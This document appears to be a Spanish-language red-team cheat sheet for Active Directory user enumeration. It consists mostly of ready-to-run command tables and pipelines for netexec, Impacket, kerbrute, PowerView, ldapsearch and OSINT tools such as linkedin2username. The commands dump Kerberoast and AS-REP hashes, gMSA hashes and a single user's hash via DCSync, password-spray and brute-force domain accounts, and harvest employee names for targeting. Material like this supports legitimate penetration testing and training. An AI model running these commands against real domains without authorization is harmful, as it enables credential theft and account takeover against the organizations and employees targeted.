---
aliases:
  - User Enum Tooling
  - kerbrute
  - linkedin2username
  - GetADUsers
tags:
  - type/tool
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[AD - Users Enumeration]]'
  - '[[netexec]]'
  - '[[Impacket Toolkit]]'
---
# AD - Users Enumeration - Tooling

***

## netexec

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --users` | Users LDAP | Standard. |
| `nxc smb <DC> -u u -p p --users` | Users SAMR | Alt path. |
| `nxc smb <DC> -u '' -p '' --users` | Anonymous attempt | Misconfig hunt. |
| `nxc ldap <DC> -u u -p p --asreproastable` | AS-REP roastable | Pre-attack. |
| `nxc ldap <DC> -u u -p p --kerberoasting kerb.hash` | Kerberoast bulk dump | Pre-attack. |
| `nxc ldap <DC> -u u -p p --admin-count` | adminCount=1 (Tier 0) | Priv enum. |
| `nxc ldap <DC> -u u -p p --password-not-required` | PASSWD_NOTREQD users | Vuln signal. |
| `nxc ldap <DC> -u u -p p --trusted-for-delegation` | UD users + computers | Critical. |
| `nxc ldap <DC> -u u -p p --gmsa` | gMSA accounts + hashes | Cred path. |
| `nxc smb <DC> -u u -p p --rid-brute 10000` | RID brute extendido | Domain grande. |
| `nxc ldap <DC> -u u -p p --query "(filter)" "attrs"` | Custom LDAP query | Targeted. |
^ad-tool-netexec-users

```bash
# Pipeline post-foothold
DC=10.10.10.10
USER=auditor; PASS='Pass!'

nxc ldap $DC -u $USER -p $PASS --users > users_ldap.txt
nxc ldap $DC -u $USER -p $PASS --asreproastable > asrep.txt
nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.hash
nxc ldap $DC -u $USER -p $PASS --admin-count > admins.txt
nxc ldap $DC -u $USER -p $PASS --password-not-required > vuln.txt
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation > deleg.txt
```

___

## Impacket

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetADUsers -all corp.local/u:p -dc-ip <DC> -outputfile users.csv` | Users + LastLogon CSV | Reportable. |
| `impacket-GetADUsers -all corp.local/u:p -dc-ip <DC> -k -no-pass` | Auth Kerberos | OPSEC sin password. |
| `impacket-samrdump corp.local/u:p@<DC>` | SAMR detallado | Más info que GetADUsers. |
| `impacket-samrdump 'corp.local/'@<DC>` | Anonymous SAMR | Si null. |
| `impacket-lookupsid 'corp.local/u:p'@<DC> 10000` | RID brute LSARPC | Authenticated brute. |
| `impacket-lookupsid 'corp.local/'@<DC>` | Anonymous lookupsid | Null check. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request` | Kerberoast bulk | Pre-attack. |
| `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip <DC>` | AS-REP sin auth | Targeted. |
| `impacket-secretsdump corp.local/admin:pass@<DC> -just-dc-user <victim>` | Single user hash (priv) | Targeted DCSync. |
^ad-tool-impacket-users

```bash
# Authenticated RID brute (más confiable que --rid-brute)
impacket-lookupsid 'corp.local/auditor:Pass!'@<DC> 10000 |
  grep "SidTypeUser" |
  awk '{print $2}' |
  cut -d'\\' -f2 > users.txt
```

___

## kerbrute

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerbrute userenum --dc <DC> -d corp.local users.txt` | Validar users via Kerberos | Sin creds. |
| `kerbrute userenum --dc <DC> -d corp.local users.txt -o valid.txt -t 100` | Output + threads | Pipeline. |
| `kerbrute passwordspray --dc <DC> -d corp.local users.txt 'Spring2026!'` | Spray post-validation | Adjacent. |
| `kerbrute bruteuser --dc <DC> -d corp.local pass.txt <user>` | Brute single user | Edge. |
| `kerbrute bruteforce --dc <DC> -d corp.local creds.txt` | user:pass list | Edge. |
^ad-tool-kerbrute

**Por qué OPSEC-friendly:** AS-REQ no incrementa `BadPasswordCount`. No triggers lockout en userenum (solo en bruteforce/spray).

```bash
# Install + use
go install github.com/ropnop/kerbrute@latest
# o binary release directo
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64

# Pipeline
./kerbrute_linux_amd64 userenum --dc <DC> -d corp.local usernames.txt -o valid.txt -t 100
```

___

## PowerView / pywerview

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-DomainUser` | Todos users | Standard. |
| `Get-DomainUser -SPN` | Kerberoastables | Pre-attack. |
| `Get-DomainUser -PreauthNotRequired` | AS-REP roastables | Pre-attack. |
| `Get-DomainUser -AdminCount` | adminCount=1 | Priv enum. |
| `Get-DomainUser -AllowDelegation` | UD + constrained | Critical. |
| `Get-DomainUser -TrustedToAuth` | Constrained con protocol transition | S4U. |
| `Get-DomainUser -Identity <user>` | Per-user detail | Targeted. |
| `Get-DomainUser -LDAPFilter "(description=*pass*)"` | Custom filter | Cred hunt. |
| `Find-DomainUserLocation -UserIdentity <user>` | Sessions del user | Targeted hunt. |
| `Find-LocalAdminAccess` | Hosts donde sos local admin | Lateral. |
| `pywerview get-netuser -u u -p p -d corp.local --dc-ip <DC>` | Linux equivalent | Sin Windows. |
| `pywerview get-netuser ... --spn` | Kerberoastables Linux | Linux. |
^ad-tool-powerview-users

```powershell
# Pipeline PowerView
Import-Module .\PowerView.ps1

Get-DomainUser -SPN | Select Name,SamAccountName,@{n='SPNs';e={$_.serviceprincipalname -join '; '}}
Get-DomainUser -PreauthNotRequired
Get-DomainUser -AdminCount
Get-DomainUser -AllowDelegation
Find-DomainUserLocation -UserIdentity "Administrator"
```

___

## ldapsearch / Linux LDAP

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b DC=corp,DC=local "(filter)" attrs` | Auth + base + filter | Standard. |
| `-H ldaps://<DC>` | LDAPS encrypted | OPSEC. |
| `-Y GSSAPI` | Kerberos bind | Tras kinit. |
| `-p 3268` | GC port (forest queries) | Cross-domain. |
| `-E pr=1000/noprompt` | Paged results | Domain grande. |
| `windapsearch.py -d corp.local -u u -p pass --dc-ip <DC> -m users` | Wrapper amigable | Sin filters complejos. |
| `windapsearch.py ... -m all` | All modules (users + groups + computers + GPOs) | Comprehensive. |
| `ldapdomaindump 'corp\u:p'@<DC> -o report/` | HTML + JSON + GREP report | Auditor-friendly. |
^ad-tool-ldapsearch-users

```bash
LS="ldapsearch -h <DC> -D 'corp\\u' -w pass -b DC=corp,DC=local"

# Active normal accounts con email
$LS "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=512))" samAccountName mail

# AS-REP roastable
$LS "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samAccountName

# Kerberoastable
$LS "(&(objectCategory=user)(servicePrincipalName=*))" samAccountName servicePrincipalName

# Unconstrained delegation
$LS "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" samAccountName

# Cred leak en description
$LS "(&(objectCategory=user)(|(description=*pass*)(description=*pwd*)))" samAccountName description

# Forest-wide via GC
ldapsearch -h <DC> -p 3268 -D 'corp\\u' -w pass -b "" "(objectCategory=user)" samAccountName
```

___

## linkedin2username / Wordlist Generators

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 linkedin2username.py -c "Target Co" -u u -p p -n corp.local` | Usernames generados desde LinkedIn employees | OSINT pre-engagement. |
| `./username-anarchy -i names.txt > usernames.txt` | Permutations desde "First Last" | Standard. |
| `cewl https://corp.com -d 2 -m 5 -w companywords.txt` | Wordlist desde sitio público | Naming patterns. |
| `theHarvester -d corp.com -b google,bing,linkedin` | Multi-source emails + names | OSINT. |
| `h8mail -t target@corp.com` | Breach DB lookup | Pwned creds históricos. |
| `gitleaks detect --source <repo>` | Secrets en repos públicos | Code OSINT. |
^ad-tool-wordlists-users

```bash
# Pipeline OSINT → AD validation
git clone https://github.com/initstring/linkedin2username
python3 linkedin2username.py -c "Target Company" -u atacante -p pass -n corp.local

# Combine outputs + dedupe
cat *.txt | sort -u > all_users.txt

# Validate
kerbrute userenum --dc <DC> -d corp.local all_users.txt -o valid.txt

# Spray opcional post-validation
kerbrute passwordspray --dc <DC> -d corp.local valid.txt 'Spring2026!'
```

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| SecLists Usernames | `/usr/share/seclists/Usernames/` |
| `Names/names.txt` (50K+ first names) | SecLists |
| `Names/familynames-usa-top1000.txt` | SecLists |
| `cirt-default-usernames.txt` | Vendor defaults |
| HackTricks AD Methodology | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology` |
| The Hacker Recipes — Recon | `https://www.thehacker.recipes/ad/recon` |
| MITRE ATT&CK T1087 | `https://attack.mitre.org/techniques/T1087/` |
| `awesome-active-directory` | `https://github.com/Orange-Cyberdefense/awesome-activedirectory` |
| netexec docs | `https://www.netexec.wiki` |
| Impacket | `https://github.com/fortra/impacket` |
| kerbrute | `https://github.com/ropnop/kerbrute` |
| linkedin2username | `https://github.com/initstring/linkedin2username` |
^ad-tool-resources-users

***
